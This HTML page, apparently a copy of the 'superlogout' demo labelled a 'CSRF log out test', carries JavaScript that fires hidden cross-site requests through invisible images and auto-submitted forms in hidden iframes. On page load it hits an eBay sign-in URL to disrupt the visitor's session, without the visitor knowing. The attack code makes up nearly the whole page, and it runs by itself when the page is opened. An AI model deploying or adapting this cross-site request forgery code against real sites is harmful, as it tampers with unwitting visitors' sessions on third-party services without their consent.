<!DOCTYPE html>
<html>
<head>
  <title>CSRF LOGOUT</title>
  <style>
    @import url(http://fonts.googleapis.com/css?family=Share+Tech+Mono);
    body {
      font-family: terminal;
      margin-top: 5em;
      background: red;
      color: white;
    }
    
    h1 {
      margin: 0 auto;
      text-align: center;
      font-size: 4em;
    }
    
    h3 {
      margin: 0 auto;
      margin-top: 20px;
      text-align: center;
      font-size: 1em;
      color: #989898;
    }
    ul {
      width: 500px;
      margin: 2em auto;
      list-style: none;
      background: white;
      padding: 25px 30px;
      -webkit-border-radius: 10px;
      -moz-border-radius: 10px;
      border-radius: 10px;
      -webkit-box-shadow: 0px 0px 101px -14px rgba(255,255,255,1);
      -moz-box-shadow: 0px 0px 101px -14px rgba(255,255,255,1);
      box-shadow: 0px 0px 101px -14px rgba(255,255,255,1);
    }
    li {
      line-height: 26px;
      color: black;
    }
    li > span {
      float: right;
    }
    a {
      text-decoration: none;
      color: #1093D8;
    }
    svg {
      width: 600px;
      height: 120px;
      display: block;
      position: relative;
      overflow: hidden;
      margin: 0 auto;
      background: black;
    }
  
    .hidden {
      position: fixed;
      width: 1px;
      height: 1px;
      overflow: hidden;
      top: -10px;
      left: -10px;
    }
    
    .success {
      font-weight: bold;
      color: #0a0;
    }
    
    .error {
      color: #a00;
    }
    .favicon {
      background: white;
      padding: 5px;
      float: left;
      margin-right: 15px;
    }
  </style>
  <script>
    function cleanup(func, el, delayCleanup) {
      return function() {
        if (delayCleanup) {
          delayCleanup = false;
          return;
        }
        func();
        el.parentNode.removeChild(el);
      };
    }
  
    function get(url) {
      return function(success, error) {
        var img = document.createElement("img");
        img.onload = cleanup(success, img);
        img.onerror = cleanup(success, img);
        img.className = "hidden";
        document.body.appendChild(img);
        img.src = url;
        return url;
      };
    }
    
    var numPostFrames = 0;
    function post(url, params, fakeOk) {
      params = params || {};
      return function(success, error) {
        var form = document.createElement("form");
        var iframe = document.createElement("iframe");
        iframe.className = "hidden";
        iframe.onload = cleanup(cleanup(success, form), iframe, true);
        iframe.onerror = cleanup(cleanup(error, form), iframe, true);
        iframe.name = "iframe" + numPostFrames++;
        document.body.appendChild(iframe);
        
        form.action = url;
        form.method = "POST";
        form.target = iframe.name;
        
        for (var param in params) {
          if (params.hasOwnProperty(param)) {
            var input = document.createElement("input");
            input.type = "hidden";
            input.name = param;
            input.value = params[param];
            form.appendChild(input);
          }
        }
        
        document.body.appendChild(form);
        form.submit();
        
        if (fakeOk) {
          success();
        }
        return url;
      };
    }
    
    function and(one, two) {
      return function(success, error) {
        var oneSuccess = false;
        var twoSuccess = false;
        var oneSuccessFunc = function() {
          oneSuccess = true;
          if (twoSuccess) {
            success();
          }
        };
        var twoSuccessFunc = function() {
          twoSuccess = true;
          if (oneSuccess) {
            success();
          }
        };
        one(oneSuccessFunc, error);
        return two(twoSuccessFunc, error);
      }
    }
    function extractDomain(url) {
      var domain;
      //find & remove protocol (http, ftp, etc.) and get domain
      if (url.indexOf("://") > -1) {
        domain = url.split('/')[2];
      }
      else {
        domain = url.split('/')[0];
      }
      //find & remove port number
      domain = domain.split(':')[0];
      return domain;
    }
    
    function doSites(list, sites) {
      sites.forEach(function(site) {
        if (!site.length) {
          return;
        }
        
        var name = site[0];
        var action = site[1];
        
        var li = document.createElement("li");
        var faviconNode = document.createElement("img");
        faviconNode.className = "favicon";
        var nameNode = document.createElement("strong");
        nameNode.appendChild(document.createTextNode(name));
        var statusNode = document.createElement("span");
        statusNode.innerHTML = "...";
        li.appendChild(faviconNode);
        li.appendChild(nameNode);
        li.appendChild(statusNode);
        
        var success = function() {
          statusNode.innerHTML = "OK";
          statusNode.className = "success";
        };
        var error = function() {
          statusNode.innerHTML = "error";
          statusNode.className = "error";
        };
        
        var url = action(success, error);
        faviconNode.src = "https://www.google.com/s2/favicons?domain=" + extractDomain(url);
        
        list.appendChild(li);
      });
    }
    
    window.onload = function() {
      doSites(document.getElementById("sitelist"), [
       
        ["eBay", get("https://signin.ebay.com/ws/eBayISAPI.dll?SignIn")],
        
      ])
    };
    var _gaq = _gaq || [];
    _gaq.push(['_setAccount', 'UA-62125712-1']);
    _gaq.push(['_trackPageview']);
    (function() {
      var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
      ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
      var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
    })();
  </script>
</head>
<body>
  <svg version="1.1" id="Ebene_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"      width="600px" height="100px" viewBox="0 0 600 100">
    <style type="text/css">
      <![CDATA[
        text {
          filter: url(#filter);
          fill: white;
          font-family: 'Share Tech Mono', sans-serif;
          font-size: 100px;
          -webkit-font-smoothing: antialiased;
          -moz-osx-font-smoothing: grayscale;
        }
      ]]>
    </style>
      <defs>
        <filter id="filter">
          <feFlood flood-color="black" result="black" />
          <feFlood flood-color="red" result="flood1" />
          <feFlood flood-color="limegreen" result="flood2" />
          <feOffset in="SourceGraphic" dx="3" dy="0" result="off1a"/>
          <feOffset in="SourceGraphic" dx="2" dy="0" result="off1b"/>
          <feOffset in="SourceGraphic" dx="-3" dy="0" result="off2a"/>
          <feOffset in="SourceGraphic" dx="-2" dy="0" result="off2b"/>
          <feComposite in="flood1" in2="off1a" operator="in"  result="comp1" />
          <feComposite in="flood2" in2="off2a" operator="in" result="comp2" />
          <feMerge x="0" width="100%" result="merge1">
            <feMergeNode in = "black" />
            <feMergeNode in = "comp1" />
            <feMergeNode in = "off1b" />
            <animate attributeName="y" id = "y" dur ="4s" values = '104px; 104px; 30px; 105px; 30px; 2px; 2px; 50px; 40px; 105px; 105px; 20px; 6ßpx; 40px; 104px; 40px; 70px; 10px; 30px; 104px; 102px'                    keyTimes = '0; 0.362; 0.368; 0.421; 0.440; 0.477; 0.518; 0.564; 0.593; 0.613; 0.644; 0.693; 0.721; 0.736; 0.772; 0.818; 0.844; 0.894; 0.925; 0.939; 1' repeatCount = "indefinite" />
            <animate attributeName="height" id = "h" dur ="4s" values = '10px; 0px; 10px; 30px; 50px; 0px; 10px; 0px; 0px; 0px; 10px; 50px; 40px; 0px; 0px; 0px; 40px; 30px; 10px; 0px; 50px' keyTimes = '0; 0.362; 0.368; 0.421; 0.440; 0.477; 0.518; 0.564; 0.593; 0.613; 0.644; 0.693; 0.721; 0.736; 0.772; 0.818; 0.844; 0.894; 0.925; 0.939; 1' repeatCount = "indefinite" />
          </feMerge>
          <feMerge x="0" width="100%" y="60px" height="65px" result="merge2">
            <feMergeNode in = "black" />
            <feMergeNode in = "comp2" />
            <feMergeNode in = "off2b" />
            <animate attributeName="y" id = "y" dur ="4s" values = '103px; 104px; 69px; 53px; 42px; 104px; 78px; 89px; 96px; 100px; 67px; 50px; 96px; 66px; 88px; 42px; 13px; 100px; 100px; 104px;' keyTimes = '0; 0.055; 0.100; 0.125; 0.159; 0.182; 0.202; 0.236; 0.268; 0.326; 0.357; 0.400; 0.408; 0.461; 0.493; 0.513; 0.548; 0.577; 0.613; 1' repeatCount = "indefinite" />
            <animate attributeName="height" id = "h" dur = "4s" values = '0px; 0px; 0px; 16px; 16px; 12px; 12px; 0px; 0px; 5px; 10px; 22px; 33px; 11px; 0px; 0px; 10px' keyTimes = '0; 0.055; 0.100; 0.125; 0.159; 0.182; 0.202; 0.236; 0.268; 0.326; 0.357; 0.400; 0.408; 0.461; 0.493; 0.513;  1' repeatCount = "indefinite" />
          </feMerge>
          <feMerge>
            <feMergeNode in="SourceGraphic" />
            <feMergeNode in="merge1" />
            <feMergeNode in="merge2" />
          </feMerge>
        </filter>
      </defs>
      <g>
        <text x="0" y="100">
          SUPERLOGOUT
        </text>
      </g>
  </svg>

  <h3>CSRF log out test-Nehal Ghoratkar: <a href="github.com/superlogout/superlogout.github.io">github.com/superlogout/superlogout.github.io</a></h3>
  <ul id="sitelist">
  </ul>
</body>
</html>
